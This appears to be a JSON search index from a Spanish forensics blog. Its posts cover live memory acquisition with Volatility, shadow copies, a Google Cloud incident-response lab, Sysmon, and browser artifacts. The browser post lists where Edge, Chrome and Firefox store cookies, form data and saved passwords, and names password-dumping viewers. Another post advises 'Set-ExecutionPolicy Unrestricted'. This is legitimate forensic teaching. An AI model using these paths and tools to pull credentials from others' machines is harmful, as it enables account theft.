    "snippet": "En este caso vamos a realizar una obtención de datos en caliente, es decir mientras el equipo sigue encendido.Estos tipos de análisis son muy delicados ya que el objetivo se trata de recolectar tod...",
    "content": "En este caso vamos a realizar una obtención de datos en caliente, es decir mientras el equipo sigue encendido.Estos tipos de análisis son muy delicados ya que el objetivo se trata de recolectar todos los datos posibles de la máquina en su estado actual pero, como bien sabemos estos datos están en constante cambio si esta se encuentra encendida.En casos así podemos encontrar discos cifrados a los que si no accedemos en caliente posiblemente sea imposible o muy complejo realizarlo en un análisis post-mortem sin la clave de cifrado.Es por eso que es importante o bien realizar la extracción de evidencias de forma lógica con el sistema arrancado (evitando lo máximo posible la modificación de cualquier parámetro o fichero del mismo) y además extraer el estado actual de la máquina; procesos, conexiones, caché, RAM, etc.HerramientasEn este tipo de análisis lo mejor es utilizar herramientas externas que no necesiten instalción o modificación de ficheros dentro de la máquina ya que evitamos modificar lo máximo posible los datos de la misma.Con esto en mente vamos a utilizar herramientas que se pueden ejecutar desde una memoria USB o similar.Extracción de datos automatizadaPara este tipo de extracción vamos a utilizar comandos que ofrece el propio sistema Windows aunque ciertos datos es mejor o unicamente se pueden extraer con herramientas externas.Podemos hacer la extracción de forma manual con cada software y comando pero existen scripts automatizados que realizan esto rápidamente y guardan los datos en archivos para su posterior análisis.En internet existen distintos scripts e incluso puedes crear el tuyo propio como en este caso.DFIR Forensic ScriptGithubEste script esta creado con varios comandos incluidos en el sistema así como algunos ejecutables de terceros y es capaz de extraer esos datos y almacenarlos en formato txt, json o csv.En el enlace esta el repositorio para poder descargarlo y saber más sobre como funciona.Ejemplo de usoDescargamos el repositorio y lo guardamos en un USBDentro encontramos dos scripts .bat y .ps1Estos scripts ejecutan los mismos comandos en el sistema pero tienen un formato de salida diferente.El más recomendado es el script powershell porque nos permite seleccionar json y csv de salida a diferente del batch que solo nos permite txt.Para ejecutar ciertos comandos de ambos scripts hay que tener en cuenta que debemos tener privilegios elevados, además para poder ejecutar scripts en powershell debemos tener la política de ejecución de scripts configurada para que lo permita.Set-ExecutionPolicy UnrestrictedPowershellBatchVolcado de memoria RAMOtro banco de datos que podemos sacar de la máquina objetivo es la memoria RAM, para extraerla existen numerosos software aunque en este caso utilizaremos FTK imager portable.VolatilityGithubEn este caso vamos a utilizar la version para linux por lo que podemos instalarla o usar el binario standalone que se proporciona.Utilizando el standalone tenemos los siguiente:Ahora vamos los siguientes datos del dump de memoria.- Perfil del sistema operativo- Listado de procesos- Historial de comandos- Información detallada del sistema operativo- Ficheros cargados en memoria- Conexiones activasPerfil del sistema operativo./volatility_2.6_lin64_standalone  -f /home/kali/Desktop/practica1.raw imageinfoObservamos las posibles versiones del sistema operativoListado de procesosUna vez identificado el perfil, usa pslist o pstree para listar los procesos:./volatility_2.6_lin64_standalone  -f /home/kali/Desktop/practica1.raw --profile=Win7SP1x86 pslist./volatility_2.6_lin64_standalone  -f /home/kali/Desktop/practica1.raw --profile=Win7SP1x86 pstreeHistorial de comandos./volatility_2.6_lin64_standalone  -f /home/kali/Desktop/practica1.raw --profile=Win7SP1x86 cmdscan./volatility_2.6_lin64_standalone  -f /home/kali/Desktop/practica1.raw --profile=Win7SP1x86 consolesEs posible no encontrar cierta información ya que o no hay registro o no se almacena de forma predeterminadaInformación detallada del sistema operativo./volatility_2.6_lin64_standalone  -f /home/kali/Desktop/practica1.raw --profile=Win7SP1x86 kdbgscanFicheros cargados en memoria./volatility_2.6_lin64_standalone  -f /home/kali/Desktop/practica1.raw --profile=Win7SP1x86 modulesConexiones activas./volatility_2.6_lin64_standalone  -f /home/kali/Desktop/practica1.raw --profile=Win7SP1x86 netscan  NOTA: Si estás analizando una imagen de memoria de Linux, el procedimiento es similar, pero el perfil debe coincidir con el kernel y la distribución del sistema."
  },
  
  {
    "title": "Volume Shadow Copy",
    "url": "/posts/shadow_copy/",
    "categories": "Forense, Windows",
    "tags": "windows, forense, shadow-copy, backup",
    "date": "2025-01-04 12:58:38 +0100",
    





    
    "snippet": "Shadow Copy, también conocido como Volume Snapshot Service o VSS, es una tecnología de Microsoft Windows que permite crear copias de seguridad, ya sean manuales, automáticas o instantáneas, de arch...",
    "content": "Shadow Copy, también conocido como Volume Snapshot Service o VSS, es una tecnología de Microsoft Windows que permite crear copias de seguridad, ya sean manuales, automáticas o instantáneas, de archivos o volúmenes, incluso si están en uso. Funciona a través del servicio Volume Shadow Copy y requiere el sistema de archivos NTFS para generar y almacenar las instantáneas. Estas pueden realizarse tanto en volúmenes locales como externos utilizando cualquier componente de Windows compatible con esta tecnología.Las instantáneas pueden ofrecer a los investigadores forenses acceso a archivos eliminados entre el momento en que se creó la instantánea y el inicio de la investigación, pero solo muestran versiones anteriores de los archivos. No revelan cambios realizados antes de la creación de la instantánea.Dado que las instantáneas se generan a nivel de bloque y no de archivo, es posible que modificaciones en archivos individuales no sean suficientes para que Windows registre esos cambios en la instantánea correspondiente.Añadir almacenamientoDebido a que estamos utilizando una VM vamos a crear un segundo disco de almacenamiento para poder almacenar estas imagenes sin tener problemas de almacenamiento.Habilitar el servicio SCVCreamos el punto de restauraciónActivamos proteccion, seleccionamos la capacidad completa del disco y aplicamos los cambiosCon esto tenemos la posibilidad de ir creando puntos de restauración de forma manual pero podemos configurarlo para que se realice de forma automática.Programar las copiasAbrimos el programador de tareas de windows y creamos la nueva tarea para que se ejecute cuando indiquemos-Command \"Checkpoint-Computer -Description 'Punto de restauración automático' -RestorePointType MODIFY_SETTINGS\"Ahora podemos verificar que está activada además de poder ejecutarla de forma manualCrear puntos de restauraciónEn este caso voy a crear varios puntos de restauración de forma manual para que podamos ver el funcionamiento de forma más dinámica con un ejemplo.Comprobar versionesSe han creado tres puntos de restauración en el equipo donde se han creado documentos, instalado programas, etc…Ahora vamos a comprobar desde el mismo sistema si existien versiones anteriores de dichos ficheros haciendo uso del explorador de archivosSi como en este caso no vemos posibles versiones anteriores es posible que no sean cambios lo suficientemente sustanciales como para que windows nos indique que existen versiones anterioresCrear imagen del disco con FTKPara poder comprobar que también podemos acceder a la información de las shadow copy en un análisis post-mortem vamos a crear una imagen del disco C en el otro disco creado antes.Montamos el disco donde hemos creado la imagen del disco CShadow Copy ViewMontar la imagen del discoDescarga y uso de ShadowCopyViewshadow_copy_viewMediante este software podremos visualizar todos los cambios que existen entre las diferentes imagenes de restauración creadasEn este caso solo nos interesan las del disco F que es la evidencia mientras que las del C son las creadas por el sistema. En un análisis esas no saldrían disponiblesAhora podemos comparar por ejemplo las diferencias entre los documentos del escritorio entre la imagen más antigua y la más recienteLa más antiguaLa más recienteComprobación en línea de comandosSi queremos listar las copias creadas en el sistema podemos bien hacerlo desde la herramienta de creación dando en “Restaurar” o mediante powershell"
  },
  
  {
    "title": "Google Cloud Labs - Respuesta a una intrusión",
    "url": "/posts/google_cloud/",
    "categories": "Cloud, Google cloud",
    "tags": "google-cloud, security, incident-response, cloud-security",
    "date": "2024-12-26 00:00:00 +0100",
    





    
    "snippet": "SituaciónDurante el último año, trabajaste como analista júnior de seguridad en la nube en Cymbal Retail.Cymbal Retail es un gigante de venta minorista que en la actualidad opera en 170 tiendas fís...",
    "content": "SituaciónDurante el último año, trabajaste como analista júnior de seguridad en la nube en Cymbal Retail.Cymbal Retail es un gigante de venta minorista que en la actualidad opera en 170 tiendas físicas y una plataforma en línea en 28 países. En la empresa, se registraron $15,000 millones en ingresos en 2022. Hoy en día, tienen 80,400 empleados en todo el mundo.La empresa experimentó una brecha en la seguridad de los datos. Como miembro júnior del equipo de seguridad, ayudarás al equipo a través del ciclo de vida de este incidente de seguridad. Para esto, identicarás las vulnerabilidades relacionadas con la violación, la aislarás y la contendrás con el objetivo de evitar un mayor acceso no autorizado, recuperarás los sistemas comprometidos, vericarás el cumplimiento con frameworks y solucionarás cualquier problema pendiente relacionado con el cumplimiento.Analiza la filtración de datos y recopila informaciónUna mañana, el equipo de seguridad detecta actividad inusual dentro de sus sistemas. Una investigación más detallada de esta actividad revela rápidamente que la empresa ha sufrido una brecha masiva de seguridad en sus aplicaciones, redes, sistemas y repositorios de datos. Los atacantes obtuvieron acceso no autorizado a información sensible de los clientes, incluidos datos de tarjetas de crédito y detalles personales. Este incidente requiere atención inmediata y una investigación exhaustiva. El primer paso para comprender el alcance y el impacto de esta violación es recopilar información y analizar los datos disponibles.Primero, navegamos al Security Command Center para ver una visión general de las vulnerabilidades activas.En la consola de Google Cloud, en el menú de navegación (navigation_menu), haz clic en Seguridad &gt; Visión general. Se abrirá la página de Visión general del Security Command Center.Selecciona la pestaña “Hallazgos por tipo de recurso”. Los hallazgos de seguridad o vulnerabilidades, organizados según el tipo de recurso en la nube afectado (por ejemplo, instancias, buckets, bases de datos), se muestran aquí. Al revisar las vulnerabilidades y hallazgos activos por tipo de recurso, podrás priorizar y abordar los problemas de seguridad de manera eficaz.Notarás que hay hallazgos de alta y media gravedad relacionados con el bucket de Cloud Storage, la máquina virtual de la instancia de Compute y el firewall.A continuación, navega al informe PCI DSS.  En el menú del Security Command Center, haz clic en Cumplimiento. Se abrirá la página de Cumplimiento.  En la sección de estándares de cumplimiento de Google Cloud, haz clic en Ver detalles en el cuadro PCI DSS 3.2.1. Se abrirá el informe PCI DSS 3.2.1.  Haz clic en la columna de Hallazgos para ordenar los hallazgos y mostrar los hallazgos activos en la parte superior de la lista.El Estándar de Seguridad de Datos de la Industria de Tarjetas de Pago (PCI DSS, por sus siglas en inglés) es un conjunto de requisitos de seguridad que las organizaciones deben seguir para proteger los datos sensibles de los titulares de tarjetas. Como una empresa minorista que acepta y procesa pagos con tarjeta de crédito, Cymbal Retail también debe garantizar el cumplimiento de los requisitos de PCI DSS para proteger los datos de los titulares de tarjetas.Al examinar el informe PCI DSS 3.2.1, observa que enumera las reglas que no cumplen con los requisitos y que están relacionadas con la violación de datos:      La grabación de reglas de firewall debe estar habilitada para poder auditar el acceso a la red: Este hallazgo de gravedad media indica que la grabación de reglas de firewall está deshabilitada, lo que significa que no hay registro de qué reglas de firewall se están aplicando ni qué tráfico se está permitiendo o denegando. Esto representa un riesgo de seguridad, ya que dificulta el seguimiento e investigación de actividades sospechosas.        Las reglas de firewall no deben permitir conexiones desde todas las direcciones IP en los puertos TCP o UDP 3389: Este hallazgo de gravedad alta indica que el firewall está configurado para permitir el tráfico del Protocolo de Escritorio Remoto (RDP) para todas las instancias de la red desde todo Internet. Esto representa un riesgo de seguridad, ya que permite que cualquier persona en Internet se conecte al puerto RDP en cualquier instancia de la red.        Las reglas de firewall no deben permitir conexiones desde todas las direcciones IP en los puertos TCP o SCTP 22: Este hallazgo de gravedad alta indica que el firewall está configurado para permitir el tráfico del Protocolo de Shell Seguro (SSH) hacia todas las instancias de la red desde todo Internet. SSH es un protocolo que permite el acceso remoto seguro a una computadora. Si un atacante logra acceder a una máquina a través de SSH, podría robar datos, instalar malware o interrumpir las operaciones.        Las VMs no deben tener direcciones IP públicas asignadas: Este hallazgo de gravedad alta indica que una dirección IP particular está expuesta activamente a Internet y potencialmente accesible para personas no autorizadas. Este hallazgo se considera un riesgo de seguridad potencial, ya que podría permitir que los atacantes escaneen vulnerabilidades o lancen ataques en el recurso asociado.        Los buckets de Cloud Storage no deben ser accesibles de forma anónima o pública: Este hallazgo de gravedad alta indica que hay una entrada en la lista de control de acceso (ACL) para el bucket de almacenamiento que es públicamente accesible, lo que significa que cualquier persona en Internet puede leer los archivos almacenados en el bucket. Esta es una vulnerabilidad de seguridad de alto riesgo que debe ser priorizada para su remediación.        Las instancias no deben estar configuradas para usar la cuenta de servicio predeterminada con acceso total a todas las API de Cloud: Este hallazgo de gravedad media indica que a una identidad o cuenta de servicio se le ha otorgado acceso total a todas las API de Google Cloud. Este hallazgo se considera un riesgo de seguridad significativo, ya que otorga a la identidad o cuenta de servicio la capacidad de realizar cualquier acción dentro del entorno de Google Cloud, incluidas la accesibilidad a datos sensibles, la modificación de configuraciones y la eliminación de recursos.  La siguiente tabla empareja las reglas listadas en el informe con su categoría correspondiente de hallazgos.A continuación, navega al Security Command Center y filtra los hallazgos para un examen y análisis más detallado de las vulnerabilidades en el entorno de Google Cloud.  En la consola de Google Cloud, en el menú de navegación (navigation_menu), haz clic en Seguridad &gt; Hallazgos. Se abrirá la página de Hallazgos.  En el panel de Filtros rápidos, en la sección de Tipo de recurso, selecciona la casilla de verificación para el tipo de recurso Google Cloud Storage bucket.Los siguientes hallazgos activos relacionados con el bucket de almacenamiento deben ser listados:      ACL pública del bucket: Este hallazgo está listado en el informe PCI DSS e indica que cualquier persona con acceso a Internet puede leer los datos almacenados en el bucket.        Política de bucket deshabilitada: Esto indica que no hay una política explícita en el bucket para controlar quién puede acceder a los datos en él.        Registro del bucket deshabilitado: Esto indica que no se ha habilitado el registro para el bucket, por lo que será difícil rastrear quién está accediendo a los datos.  Estos hallazgos indican que el bucket está configurado con una combinación de configuraciones de seguridad que podrían exponer los datos a accesos no autorizados. Deberás remediar estos hallazgos eliminando la lista de control de acceso pública, deshabilitando el acceso público al bucket y habilitando la política de acceso uniforme a nivel de bucket.En el panel de Filtros rápidos, en la sección de Tipo de recurso, desmarca Google Cloud storage bucket y selecciona la casilla de verificación para el tipo de recurso Google Compute Instance.Los siguientes hallazgos activos relacionados con la máquina virtual cc-app-01 deben ser listados:      Malware bad domain: Este hallazgo indica que un dominio conocido por estar asociado con malware fue accesado desde la instancia google.compute.instanc* llamada cc-app-01. Aunque este hallazgo se considera de baja gravedad, indica que ha ocurrido una actividad maliciosa en la instancia de la máquina virtual y que ha sido comprometida.        Secure boot deshabilitado: Este hallazgo de gravedad media indica que el arranque seguro está deshabilitado para la máquina virtual. Esto representa un riesgo de seguridad, ya que permite que la máquina virtual inicie con código no autorizado, lo que podría ser utilizado para comprometer el sistema.        Cuenta de servicio predeterminada usada: Este hallazgo de gravedad media indica que la máquina virtual está utilizando la cuenta de servicio predeterminada. Esto representa un riesgo de seguridad, ya que la cuenta de servicio predeterminada tiene un alto nivel de acceso y podría ser comprometida si un atacante obtiene acceso al proyecto.        Dirección IP pública: Este hallazgo de gravedad alta está listado en el informe PCI DSS e indica que la máquina virtual tiene una dirección IP pública. Esto representa un riesgo de seguridad, ya que permite que cualquier persona en Internet se conecte directamente a la máquina virtual.        Acceso completo a las API: Este hallazgo de gravedad media está listado en el informe PCI DSS e indica que a la máquina virtual se le ha otorgado acceso completo a todas las API de Google Cloud.  Arreglar las vulnerabilidades de Compute EngineApagarás la máquina virtual vulnerable cc-app-01 y crearás una nueva máquina virtual a partir de una instantánea tomada antes de la infección por malware. Las instantáneas de la máquina virtual son efectivas para restaurar el sistema a un estado limpio y aseguran que la nueva máquina virtual no estará infectada con el mismo malware que comprometió la máquina virtual original.      En la consola de Google Cloud, haz clic en el menú de navegación (navigation_menu).        Selecciona Compute Engine &gt; VM instances. Se abrirá la página de Instancias de VM.  La máquina virtual cc-app-01 actual debe estar listada bajo Instancias de VM. Esta es la máquina virtual vulnerable que ha sido comprometida y debe apagarse.  Marca la casilla para la máquina virtual cc-app-01.  Haz clic en Detener.  Aparecerá una ventana emergente pidiéndote confirmar que la máquina virtual debe ser detenida, haz clic en Detener.A continuación, crea una nueva máquina virtual a partir de una instantánea. Esta instantánea ya ha sido creada como parte del plan de respaldo de datos a largo plazo de Cymbal Retail.      En la barra de acciones, haz clic en + Crear instancia.        En el campo Nombre, escribe cc-app-02.        En la sección Tipo de máquina, expande el menú desplegable, selecciona Shared-core, y luego selecciona e2-medium.        En la sección Disco de arranque, haz clic en Cambiar. Se abrirá el cuadro de diálogo del disco de arranque.        Selecciona la pestaña Instantáneas.        Expande el menú desplegable de Instantánea, y selecciona cc-app01-snapshot.        Haz clic en Seleccionar.        En la sección Identidad y acceso a la API, expande el menú desplegable de Cuentas de servicio, y selecciona Qwiklabs User Service Account.        Expande la sección de Opciones avanzadas.        Expande la sección de Redes.        En el campo Etiquetas de red, escribe cc. Usarás esta etiqueta para aplicar reglas de firewall a esta máquina virtual específica.        En la sección de Interfaces de red, expande la red predeterminada.        Expande el menú desplegable de Dirección IPv4 externa, y selecciona Ninguna.        Haz clic en Crear.  La nueva máquina virtual cc-app-02 ahora debería haber sido creada a partir de la instantánea cc-app01-snapshot. (Puede tardar unos minutos en crearse la nueva VM).Ahora, activa el Arranque Seguro para la nueva máquina virtual cc-app-02 para abordar el hallazgo de Arranque Seguro deshabilitado.      Marca la casilla para la máquina virtual cc-app-02.        Haz clic en Detener.        Aparecerá una ventana emergente pidiéndote confirmar que la máquina virtual debe ser detenida, haz clic en Detener.Espera a que la máquina virtual cc-app-02 se detenga antes de continuar.        En la sección de Instancias de VM, haz clic en el enlace cc-app-02. Se abrirá la página de cc-app-02.        En la barra de herramientas de cc-app-02, haz clic en Editar. Se abrirá la página Editar instancia cc-app-02.        Desplázate hacia abajo hasta la sección de Seguridad y acceso, y bajo VM blindada, marca la casilla para la opción Activar Arranque Seguro. Esto resolverá el hallazgo de Arranque Seguro deshabilitado.        Haz clic en Guardar.        En el menú de Compute Engine, selecciona Instancias de VM.        Marca la casilla para la máquina virtual cc-app-02.        Haz clic en Iniciar/Reanudar.        Aparecerá una ventana emergente pidiéndote confirmar que la máquina virtual debe ser iniciada, haz clic en Iniciar.  La instancia de la máquina virtual cc-app-02 se reiniciará y el hallazgo de Arranque Seguro deshabilitado será corregido.Arreglar los permisos del bucket de Cloud StorageRevocarás el acceso público al bucket de almacenamiento y cambiarás a control de acceso uniforme a nivel de bucket, lo que reducirá significativamente el riesgo de brechas de datos. Al eliminar todos los permisos de usuario del bucket de almacenamiento, puedes evitar el acceso no autorizado a los datos almacenados.      En el menú de navegación, selecciona Cloud Storage &gt; Buckets. Se abrirá la página de Buckets.        Haz clic en el enlace del bucket _bucket storage. Se abrirá la página de detalles del bucket.  Notarás que hay un archivo myfile.csv en el bucket accesible públicamente. Este es el archivo que contiene la información sensible que fue volcada por el actor malicioso. Realiza los siguientes pasos para abordar el hallazgo de Public bucket ACL.      Haz clic en la pestaña Permissions.        En el cuadro de Public access, haz clic en Prevent public access.        Haz clic en Confirm.  Limitar el acceso a los puertos del firewallRestringirás el acceso a los puertos RDP y SSH solo a redes de origen autorizadas para minimizar la superficie de ataque y reducir el riesgo de acceso remoto no autorizado.Ejercita una extrema precaución antes de modificar reglas de firewall demasiado permisivas. Las reglas pueden estar permitiendo tráfico legítimo, y restringirlo incorrectamente podría interrumpir operaciones críticas. En este laboratorio, asegúrate de que las instancias de máquina virtual de Compute Engine etiquetadas con la etiqueta de destino “cc” sigan siendo accesibles a través de conexiones SSH desde el rango de direcciones de Google Cloud Identity-Aware Proxy (35.235.240.0/20). Para mantener el acceso continuo de administración, crea una nueva regla de firewall de acceso limitado para el tráfico SSH antes de eliminar la regla existente que permite conexiones SSH desde cualquier dirección.Arreglar la configuración del firewallEliminarás tres reglas específicas de firewall de VPC que son responsables de permitir el acceso sin restricciones a ciertos protocolos de red, como ICMP, RDP y SSH, desde cualquier fuente dentro de la red VPC. Luego, habilitarás el registro en las reglas de firewall restantes.Eliminarás las reglas de firewall default-allow-icmp, default-allow-rdp y default-allow-ssh. Estas reglas son demasiado amplias y, al eliminarlas, permitirás un entorno de red más seguro y controlado.Al eliminar estas reglas, habrás restringido el acceso a estos protocolos, limitando el potencial de intentos de acceso no autorizado y reduciendo la superficie de ataque de tu red.Enable loggingHabilita el registro para las reglas de firewall limit-ports (la regla que creaste en una tarea anterior) y default-allow-internal.Habilitar el registro te permite rastrear y analizar el tráfico que es permitido por esta regla, lo cual probablemente sea tráfico interno entre instancias dentro de tu VPC.Verificar cumplimientoDespués de abordar diligentemente las vulnerabilidades identificadas en el informe PCI DSS 3.2.1, es crucial verificar la efectividad de tus esfuerzos de remediación. En esta tarea, volverás a ejecutar el informe para asegurarte de que las vulnerabilidades previamente identificadas hayan sido mitigadas con éxito y ya no representen un riesgo de seguridad para el entorno.      En el menú de Security Command Center, haz clic en Compliance. Se abrirá la página de cumplimiento.        En la sección de Google Cloud compliance standards, haz clic en View details en el recuadro de PCI DSS 3.2.1. Se abrirá el informe PCI DSS 3.2.1.        Haz clic en la columna de Findings para ordenar los hallazgos y mostrar los hallazgos activos en la parte superior de la lista.  Todas las vulnerabilidades principales ahora están resueltas.Aunque abordaste las vulnerabilidades de alta y media severidad, los registros de flujo siguen deshabilitados para varias subredes. Este hallazgo seguirá visible en el informe después de que hayas completado las tareas de remediación, ya que está relacionado con este entorno de laboratorio."
  },
  
  {
    "title": "Sysmon en Windows",
    "url": "/posts/sysmon_windows/",
    "categories": "Forense, Monitorización",
    "tags": "sysmon, windows, monitorización, seguridad",
    "date": "2024-12-20 12:58:38 +0100",
    





    
    "snippet": "¿Qué es sysmon?Sysmon (System Monitor) es una herramienta avanzada de la suite Sysinternals de Microsoft que proporciona monitoreo detallado de actividades del sistema en tiempo real. Sysmon captur...",
    "content": "¿Qué es sysmon?Sysmon (System Monitor) es una herramienta avanzada de la suite Sysinternals de Microsoft que proporciona monitoreo detallado de actividades del sistema en tiempo real. Sysmon captura eventos clave, como cambios en el registro, creación de procesos, conexiones de red, y manipulación de archivos, entre otros. Estos eventos se registran en los logs de eventos de Windows, permitiendo a los administradores y analistas de seguridad identificar comportamientos sospechosos, investigar incidentes y realizar análisis forenses. Es altamente configurable mediante un archivo de configuración XML que define qué eventos deben ser monitoreados y cómo.Monitoriza:  Procesos que se crean  Conexiones de red  Cambios en el registro  Comandos que se ejecutanInstalaciónSistema operativoWindows 10 Pro 22H2 19045.3803Descarga  Sysmon Windows  Sysmon LinuxInstalaciónUna vez descargado y extraido en la ruta del ejcutable abrimos un terminal como administrador y ejecutamos:sysmon -accepteula -iConfiguración por defectoEsto instalará el sofware con una configuración por defectoConfiguración personalizadaArchivo de configuraciónsysmon -accepteula -i c:\\ruta\\config.xml # Si es la primera instalaciónsysmon -c c:\\ruta\\config.xml # Si quieres asignar una configuración al software ya instaladoVisualización de logsVisor de eventosPara ver el contenido que crea este software podemos consultar la documentación oficial de Microsoft.Para ver los registros que crea debemos utilizar el visualizador de eventos de windows, simplemente en el inicio escribimos eventos e iniciamos el visualizador.Archivo de configuraciónEn el anterior apartado veremos todos los registros que nosotros hayamos configurado en el archivo de configuración cargado en el programa.Si abrimos el archivo xml veremos la estructura en la que este indica que patrones debe tomar para monitorizar según que procesos y crear registros sobre los mismosCrea registros de los servicios de red, el svchosts para registrar los servicios creados y en ejecución…Se puede añadir que registre cualquier conexión mediante Tor, ssh, proxy socks5/4, conexiónes SSH, Telnet, etc…EjemploComo en este caso indicamos el cambio de configuración después de la instalación, esto tambien queda registrado.Ejemplo práctico - Cargar el registroEn este caso se han realizado una serie de actividades en el equipo que iremos averiguando gracias a los registros creados por sysmon.Antes de comenzar con la visualización de los mismos debemos localizar su ubicación en el sistema de archivos y, además usaremos un software para facilitar la visualización de los mismos.Ubicación de registrosC:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4OperationalSysmonViewerSysmonTools - dentro buscamos SysmonViewerExtraer los registrosImportar el registro en SysmonViewEjemplo práctico - Analizar los resultadosEn SysmonView tendremos a la izquierda los ejecutables que han sido registrados por sysmon.Si seleccionamos alguno nos indicará la ruta del binario y además las sesiones que ha tenido abiertas y su rastro.Suponiendo que vamos a investigar lo que ha pasado en este equipo por ejemplo podemos empezar con el binario del explorador de archivos windows.Vemos varias entradas sobre un fichero llamado “SAMFW.COM_SM-G990B” que corresponde con el firmware de un telefono samsung.El fichero parece ser grande porque cuenta con varios registros de creación y file stream ya que al estár el archivo descargando este se va modificando.Poco más abajo vemos dos modificaciones en el registro, un par de creaciones de archivos más y lo que parece una ejecución de SysmonView.exe ya que al ejecutar el binario se actualiza la fecha de último uso.Si buscamos algunos binarios más ahora que sabemos lo del firmware samsung vemos que hay correlaciones con algunos de los binarios ejecutadosSi por ejemplo abrimos el registro de un binario llamado “Samsung USB driver” vemos que ha sido llamado desde el explorer.exe, se ha creado un proceso nuevo y se han creado 381 archivos y ha cambiado las fechas apertura de 594.Si segumos el rastro parece que está creando varios archivos dll y por el nombre del ejecutable deducimos que es un driver para la comunciación entre el pc y el telefono samsung.Si vamos al binario llamado ODIN vemos que ha sido ejecutado 3 veces desde el explorador de archivos en un corto periodo de tiempo.Ahora que sabemos todo esto podemos comprobar si realmente el usuario finalmente conectó el dispositivo al ordenador.Para ello como sabemos que ha instalado unos drivers propietarios y que son samsung podemos ir al binario que se encarga de ejecutar los controladores en windows en modo usuario.Aqui vemos como se cargaron varias veces lo que puede indicar las veces que se conectó el dispositivo al pcConclusiónCon estos datos que no son muy extensos ya que es un entorno de pruebas, vemos que el usuario descargó el firmware de un dispositivo Samsung modelo G990B, descargó o se transfirió un archivo llamado magisk_… que se trata de algun archivo del firmware del dispositivo modificado para tener acceso root, ejecutó el software odin varias veces, lo que puede ser indicativo de algun fallo en el proceso, al igual que las veces que conectó y desconectó el dispositivo al ordenador.Con estas pruebas mas o menos podemos deducir que se trata de un rooteo a un dispositivo movil Samsung.Esto es solo una muestra ya que como hemos visto registra cada paso que realiza cada binario, de donde viene, que hace y cuando acaba.Además no se limita a los proceos internos unicamente sino que también podemos ver las llamadas que hace fuera del equipo.Vemos llamdas DNSAqui podemos ver como el buscador de windows por defecto al traer ciertos softwares pre instalados o esperando a serlo hace varias llamadas a lo que parecen varias api de microsoft."
  },
  
  {
    "title": "Evidencias en los Navegadores Web",
    "url": "/posts/aterfactos_en_los_navegadores/",
    "categories": "Forense, Navegadores",
    "tags": "forense, browsers, chrome, firefox, edge",
    "date": "2024-12-20 12:58:38 +0100",
    





    
    "snippet": "Los navegadores web son herramientas que se utilizan en diversos dispositivos, como teléfonos móviles, tabletas, netbooks y ordenadores de escritorio. Además de permitir la navegación por internet,...",
    "content": "Los navegadores web son herramientas que se utilizan en diversos dispositivos, como teléfonos móviles, tabletas, netbooks y ordenadores de escritorio. Además de permitir la navegación por internet, también pueden emplearse para explorar los archivos almacenados en el propio dispositivo.La memoria caché del navegador puede guardar diversos tipos de contenido descargado, como imágenes, videos, documentos, programas ejecutables y scripts. Asimismo, los navegadores pueden almacenar datos introducidos por los usuarios en formularios, como búsquedas, nombres de usuario, contraseñas para correos electrónicos, redes sociales, sitios web y datos financieros, incluidos números de tarjetas de crédito.Los marcadores y el historial de búsquedas también pueden proporcionar información sobre los intereses o actividades del propietario del dispositivo, lo que puede ser útil en investigaciones.Cada navegador web deja sus propios artefactos individuales en el sistema operativo. Los tipos de artefactos del navegador web pueden variar según la versión del navegador web. Normalmente, al investigar artefactos de navegadores web, puede extraer los siguientes tipos de artefactos:  Historial de navegación  Ficheros en el directorio cache  Cookies  URL escritas  Sesiones  Sitios más visitados  Capturas de pantalla  Valores de formulario (búsquedas, autocompletar)  Archivos descargados (Descargas)  FavoritosRecolección de evidenciasMicrosoft EdgeHistorial de navegación - %localappdata%\\Microsoft\\Edge\\User Data\\Default\\HistoryCaché - %localappdata%\\Microsoft\\Edge\\User Data\\Default\\CacheCookies - %localappdata%\\Microsoft\\Edge\\User Data\\Default\\CookiesThumbnails - %localappdata%\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_DataSesiones - %localappdata%\\Microsoft\\Edge\\User Data\\Default\\SessionsValores de formulario - %localappdata%\\Microsoft\\Edge\\User Data\\Default\\Web DataHistorial de descargas - %localappdata%\\Microsoft\\Edge\\User Data\\Default\\HistoryFavoritos - %localappdata%\\Microsoft\\Edge\\User Data\\Default\\BookmarksFirefoxHistorial de navegación - %appdata%\\Mozilla\\Firefox\\Profiles\\[Perfil]\\places.sqliteFicheros en el directorio caché - %localappdata%\\Mozilla\\Firefox\\Profiles\\[Perfil]\\cache2Cookies - %appdata%\\Mozilla\\Firefox\\Profiles\\[Perfil]\\cookies.sqliteThumbnails - %appdata%\\Local\\Mozilla\\Firefox\\Profiles\\eqainsr.default-release\\cache2\\entriesSesiones - %appdata%\\Roaming\\Mozilla\\Firefox\\Profiles\\[nombre del perfil]\\Valores de formulario - %appdata%\\Mozilla\\Firefox\\Profiles\\[Perfil]\\formhistory.sqliteArchivos descargados (Descargas) - %appdata%\\Mozilla\\Firefox\\Profiles\\[Perfil]\\places.sqliteFavoritos - %appdata%\\Mozilla\\Firefox\\Profiles\\[Perfil]\\places.sqliteGoogle ChromeHistorial de navegación - %localappdata%\\Google\\Chrome\\User Data\\Default\\HistoryFicheros en el directorio caché - %localappdata%\\Google\\Chrome\\User Data\\Default\\CacheCookies - %localappdata%\\Google\\Chrome\\User Data\\Default\\CookiesSesiones - %localappdata%\\Google\\Chrome\\User Data\\Default\\SessionsThumbnails - %localappdata%\\Google\\Chrome\\User Data\\Default\\Cache\\Cache_DataValores de formulario - %localappdata%\\Google\\Chrome\\User Data\\Default\\Web DataArchivos descargados (Descargas) - %localappdata%\\Google\\Chrome\\User Data\\Default\\HistoryFavoritos - %localappdata%\\Google\\Chrome\\User Data\\Default\\BookmarksNotaTanto en chrome como firefox podemos tener varios usuarios.El nombre de la carpeta que contenga los datos varía en función de esto, por ejemplo:Firefox - los perfiles se almacenan en carpetas con nombre generados de forma nombre.default, etc…Chrome - los prefiles se almacenan en carpetas según el número del perfil, si no se ha creado ninguno nuevo será Default.FirefoxChromeHistorial de navegaciónBrowsing History ViewEdge, Chrome y FirefoxCachéMozilla cache viewer (GECKO)Chrome caché viewer (CHROMIUM)ChromeEdgeFirefoxCookiesMZCookiesViewChromeCookiesViewNotaAntes de acceder a los archivos de las cookies es necesario finalizar por completo los procesos del navegador ya que si no bloquea estos archivosEdgeChromeFirefoxThumbnailsImageCaché viewerEdgeChromeFirefoxFavoritosWebBookmarks viewArchivos descargadosBrowserDownloads viewerValores de formularioWeb Browser pass view - password (wbpv28821@)Browser AutoFill viewBrowserAutoFillViewWebBrowserPassViewBonus 